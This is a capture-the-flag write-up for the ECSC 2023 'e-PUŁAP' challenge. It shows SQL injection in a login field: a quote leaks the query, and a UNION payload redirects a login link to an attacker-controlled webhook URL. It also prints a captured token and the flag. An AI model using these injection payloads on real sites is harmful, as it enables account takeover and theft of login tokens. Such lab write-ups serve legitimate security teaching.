# e-PUŁAP

We are given an URL to a suspicous website:
![](./images/firefox_9BDORge69q.png)

To login, we only have to pass the citizen nickname.

![](./images/firefox_2WIRnOAHco.png)

Initial idea is to check for SQL injection. Very surprisingly, the website throws an error when specifying `'` as the username.

This is helpful as it leaks the query:
```sql
SELECT username, webhook_login_url FROM users WHERE username = "???"
```

When using `' or 1=1 --` as the username, we get another error:
`error:Could not resolve host: chat.evil-corporation.private`

This suggests that the website makes a request to url from `webhook_login_url`. We can try to override this URL:
```
' union select 'a' as username, 'https://webhook.site/???' as webhook_login_url --
```

Indeed, we receive a request with following message:

```
Twój link do logowania do strony sieciowej e-PUŁAP to https://e-pulap.ecsc23.hack.cert.pl/login.php?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiYSIsImV4cCI6MTY5MDIzNTg2MywiaXNzIjoibG9jYWxob3N0IiwiaWF0IjoxNjkwMjMyMjYzfQ.6B7JN1Tg7nnuXjGkHonPPZVRAr_Tp5GlkOWt8tqI7KE
```

This leads to a page with multiple images.

For example a very cool raport cover:

![Alt text](./images/okladka.png)

And the flag!

`ecsc23{paswordless_is_the_future!}`